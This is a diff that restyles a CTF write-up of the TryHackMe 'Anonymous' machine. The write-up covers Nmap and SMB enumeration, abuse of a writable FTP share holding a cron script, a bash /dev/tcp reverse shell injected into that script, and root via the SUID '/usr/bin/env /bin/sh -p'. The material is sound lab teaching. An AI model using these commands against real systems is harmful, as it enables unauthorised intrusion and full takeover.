@@ -1,22 +1,12 @@
----
-title: Anonymous
-date: 2021-12-1 11:11:11 +/-TTTT
-categories: [CTF, tryhackme]
-tags: [ftp, suid]
----
-
-Not the hacking group
-
-|Machine Name | Date | Level | Type |
-|-------------|-------|------|------|
-| Anonymous | 2 Dec 2021 | Medium | ctf |
+## Info
 
 ![infocard](https://tryhackme-images.s3.amazonaws.com/room-icons/876a5185c429c9703e625cb48c39637b.png)
 
+> Linux : Medium : Tryhackme
 
 ## Reconnaissance
 
-Start the recon with Nmap.
+The initial reconnaissance was performed using **Nmap**, revealing the following open services:
 
 ```
 Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-07 09:36 EDT
@@ -76,11 +66,11 @@ Service detection performed. Please report any incorrect results at https://nmap
 
 ```
 
-According to  Nmap output we got SSH, FTP and SMB services to test.
+According to  **Nmap** the target machine is running **FTP**, **SSH**, and **SMB** services.
 
-### smb
+### SMB Enumeration
 
-enumerate the  `pics` share.
+Using `smbclient`, I enumerated the available shares:
 
 ```bash
 smbclient -L //$ip/
@@ -95,7 +85,7 @@ SMB1 disabled -- no workgroup available
 
 ```
 
-Log in to `pics` share.
+The share `pics` was accessible and contained two image files:
 
 ```bash
 smbclient //$ip/pics
@@ -111,13 +101,11 @@ smb: \> ls
 
 ```
 
-Downloaded those files and check for stego but it's just a rabbit hole.
+After downloading and analyzing the files for hidden data (steganography), no useful information was found. This turned out to be a rabbit hole.
 
-### ftp
+### FTP Enumeration
 
-Nmap show's that we can log in as anonymous on the FTP and the FTP server is also writable. Let's log in and check the server.
-
-there is `scripts` folder in the server with some files.
+The FTP server allows anonymous login and is writable. Listing its contents revealed a `scripts` folder containing several files:
 
 ```
 ftp> ls -la
@@ -132,9 +120,7 @@ drwxr-xr-x    3 65534    65534        4096 May 13  2020 ..
 
 ```
 
-We can assume that a cronjob is set for `clean.sh`. let's download all the files and find out what it doing.
-
-`clean.sh` 
+The file `clean.sh` appears to be executed periodically via a cron job. The script logic is as follows:
 
 ```bash
 #!/bin/bash
@@ -151,34 +137,37 @@ fi
 
 ```
 
-This script is checking files in `/tmp` directory and if it found any files then delete it and add the file name to file `removed_files.log` with the date.
-
-FTP server is writable so we can mount it and add our reverse shell in `clean.sh`.
+The script checks for files in the `/tmp` directory and removes them, logging the activity. Since the FTP server is writable, I modified this script to include a reverse shell.
 
 ## Gaining Access
 
-Let's Mount FTP server using `curlftpfs`.
+The FTP server was mounted using `curlftpfs`
 
-`curlftpfs anonymous@$ip mount/`
+```
+curlftpfs anonymous@$ip mount/
+```
 
-using vim added bash reverse shellcode.
+Using **vim**, I added a bash reverse shell payload to `clean.sh`:
 
-`bash -i >& /dev/tcp/ATTACKING-IP/80 0>&1`
+```
+bash -i >& /dev/tcp/ATTACKING-IP/80 0>&1
+```
 
-After some time we get a shell as `namelessone`.
+After waiting for the cron job to execute, I received a reverse shell as the user `namelessone`.
 
-![wwwshel](/assets/thm/anonymous/wwwshell.png)
+![anonymous1](media/anonymous1.png)
 
 
 ## Privilege Escalation
 
-### Namelessone to root
+### From `namelessone` to `root`
 
-After some enumeration, I found out that the SUID bit is set to `/usr/bin/env`.
+During enumeration, I discovered that the SUID bit was set on `/usr/bin/env`. Exploiting this allowed privilege escalation to `root`:
 
-`/usr/bin/env /bin/sh -p`
-
-Got root.
+```
+/usr/bin/env /bin/sh -p
+```
+Executing the above command granted root access:
 
 ```bash
 namelessone@anonymous:~$ /usr/bin/env /bin/sh -p
@@ -187,6 +176,8 @@ whoami
 root
 ```
 
-## Resources
+## Conclusion
 
-****blank****
+The `Anonymous` machine was compromised through a combination of enumeration, abuse of writable services, and exploitation of SUID misconfigurations.
+
+--- 
